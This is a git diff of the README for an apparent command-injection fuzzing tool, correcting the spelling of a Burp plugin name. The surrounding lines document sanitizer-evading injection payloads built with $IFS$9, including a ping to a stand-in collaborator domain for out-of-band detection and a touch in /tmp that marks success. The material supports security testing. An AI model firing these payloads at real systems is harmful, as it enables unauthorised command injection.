@@ -216,7 +216,7 @@ The `PAYLOAD_MARK` holder is either removed - or replaced with a unique payload 
 - `$COMMAND='ping'`, `$ARGUMENT='PAYLOAD_MARK.sub.evilcollab.org'` - this will generate commands like `ping$IFS$966.sub.evilcollab.org`. So, if this particular payload is successful, the nameserver responsible for serving the `*.sub.evilcollab.org` entries will receive a query to `66.sub.evilcollab.org` - so we know that the 66-th payload defeated the sanitizer.
 - `$COMMAND='touch'`, `$ARGUMENT='/tmp/fooPAYLOAD_MARK'` - this will generate commands like `touch$IFS$9/tmp/foo132` - so if a file /tmp/foo132 is created, we know that the 132-th payload did the trick.
 
-The tool can be used for detection directly - or in a hybrid approach, after identifying suspicious behaviours with Baskslash-powered Scanner Burp Plugin.
+The tool can be used for detection directly - or in a hybrid approach, after identifying suspicious behaviours with Backslash Powered Scanner Burp Plugin.
 
 ### Case examples
 #### 1) See the test_cases directory 
